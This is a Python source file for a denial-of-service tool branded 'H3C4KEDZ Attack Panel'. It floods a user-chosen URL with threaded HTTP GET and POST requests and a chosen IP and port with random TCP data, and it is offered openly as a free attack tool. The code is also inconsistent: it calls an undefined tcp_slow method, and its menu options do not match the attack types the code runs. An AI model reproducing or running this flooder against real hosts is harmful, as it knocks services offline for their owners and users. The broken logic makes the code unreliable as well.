import requests
import os
import threading
import time
import socket
import random


class Dos(threading.Thread):
    USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
    url = ""
    target_ip = ""
    target_port = 0

    def __init__(self, seq, attack_type, duration):
        super().__init__()
        self.seq = seq
        self.attack_type = attack_type
        self.duration = duration

    def run(self):
        start_time = time.time()
        while time.time() - start_time < self.duration:
            try:
                if self.attack_type == 1:
                    self.post_attack(Dos.url)
                elif self.attack_type == 2:
                    self.ssl_post_attack(Dos.url)
                elif self.attack_type == 3:
                    self.get_attack(Dos.url)
                elif self.attack_type == 4:
                    self.ssl_get_attack(Dos.url)
                elif self.attack_type == 5:
                    self.tcp_flooder(Dos.target_ip, Dos.target_port)
                elif self.attack_type == 6:
                    self.tcp_slow(Dos.target_ip, Dos.target_port)
            except Exception as e:
                pass

    @classmethod
    def check_connection(cls, url):
        try:
            response = requests.get(url, headers={"User-Agent": cls.USER_AGENT})
            if response.status_code == 200:
                print("\033[1;32mConnection Success")
            cls.url = url
        except Exception as e:
            pass

    @classmethod
    def ssl_check_connection(cls, url):
        try:
            response = requests.get(url, headers={"User-Agent": cls.USER_AGENT}, verify=True)
            if response.status_code == 200:
                print("\033[1;32mConnection Success")
            cls.url = url
        except Exception as e:
            pass

    @staticmethod
    def post_attack(url):
        try:
            response = requests.post(url, headers={"User-Agent": Dos.USER_AGENT, "Accept-Language": "en-US,en"},
                                     data="out of memory")
            print(f"\033[1;33mSuccess Sent: \033[1;37m{url} \033[1;31m# \033[1;33mStatus \033[1;31m---> \033[1;32m{response.status_code}")
        except Exception as e:
            pass

    @staticmethod
    def get_attack(url):
        try:
            response = requests.get(url, headers={"User-Agent": Dos.USER_AGENT})
            print(f"\033[1;33mSuccess Sent: \033[1;37m{url} \033[1;31m# \033[1;33mStatus \033[1;31m---> \033[1;32m{response.status_code}")
        except Exception as e:
            pass

    @staticmethod
    def ssl_post_attack(url):
        try:
            response = requests.post(url, headers={"User-Agent": Dos.USER_AGENT, "Accept-Language": "en-US,en"},
                                     data="out of memory", verify=True)
            print(f"\033[1;33mSuccess Sent: \033[1;37m{url} \033[1;31m# \033[1;33mStatus \033[1;31m---> \033[1;32m{response.status_code}")
        except Exception as e:
            pass

    @staticmethod
    def ssl_get_attack(url):
        try:
            response = requests.get(url, headers={"User-Agent": Dos.USER_AGENT}, verify=True)
            print(f"\033[1;33mSuccess Sent: \033[1;37m{url} \033[1;31m# \033[1;33mStatus \033[1;31m---> \033[1;32m{response.status_code}")
        except Exception as e:
            pass

    @staticmethod
    def tcp_flooder(target_ip, target_port):
        data = random._urandom(1024)
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.send(data)
                print(f"\033[1;31m[\033[1;33mTCP-FLOODER\033[1;31m] \033[1;33mSuccess Sent: \033[1;37m{target_ip}:{target_port}")
                sock.close()
            except:
                pass

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system('title H3C4KEDZ // Attack Panel // H3C4KEDZ ')
    print("""
\033[1;37m    Hello \033[1;31m. \033[1;37mWelcome To Attack Panel // H3C4KEDZ
\033[1;37m    Try \033[1;31m[\033[1;37mhelp\033[1;31m] \033[1;37mShow All Methods Attack
\033[1;37m    Use: Free Tool . Make By \033[1;32m@We_H3c4kedz \033[1;31m// \033[1;37mDeveloper By H3C4KEDZ HACKER 
\033[1;37m    Contact: \033[1;34m@H3C4KEDZ
\033[1;36m  _    _ ____   _____ _  _   _  ________ _____ ______
\033[1;36m | |  | |___ \ / ____| || | | |/ /  ____|  __ \___  /
\033[1;36m | |__| | __) | |    | || |_| ' /| |__  | |  | | / / 
\033[1;36m |  __  ||__ <| |    |__   _|  < |  __| | |  | |/ /  
\033[1;36m | |  | |___) | |____   | | | . \| |____| |__| / /__ 
\033[1;36m |_|  |_|____/ \_____|  |_| |_|\_\______|_____/_____|
\033[1;32m  DDOS ATTACK BY H3C4KEDZ HACKER 

\033[1;37m    Channel: \033[1;34m@We_H3c4kedz

\033[1;33m    Methods Attacking\033[1;31m:
\033[1;36m    (\033[1;37m1\033[1;36m) \033[1;35mHTTP-GET      \033[1;37mHTTP Server Attack GET-RQ Method
\033[1;36m    (\033[1;37m2\033[1;36m) \033[1;35mHTTP-SPAM     \033[1;37mSPAM Site Server Attack Head Method
""")
    while True:        
        attack_type = int(input("\033[1;31m[\033[1;37mpanel\033[1;31m//\033[1;37mH3C4KEDZ]~$: \033[1;30m"))

        if attack_type not in [1, 2, 3]:
            print("\033[1;31mInvalid Selection.\033[1;30m")
            continue

        if attack_type in [1, 2]:
            url = input("\033[1;37mEnter Target URL: \033[1;30m")
            Dos.url = url
        else:
            target_ip = input("\033[1;37mEnter IP: \033[1;30m")
            target_port = int(input("\033[1;37mEnter Port: \033[1;30m"))
            Dos.target_ip = target_ip
            Dos.target_port = target_port

        thread_count = int(input("\033[1;37mEnter Threads: \033[1;30m"))
        duration = int(input("\033[1;37mEnter Time: \033[1;30m"))

        for i in range(thread_count):
            dos = Dos(i, attack_type, duration)
            dos.start()
        q = input("\033[1;37mINTER TO ATTACK: \033[1;30m")

        if q.lower() != 'y':
            break

    print("\033[1;32mThank you for using H3C4KEDZ Attack Tool.\033[1;30m")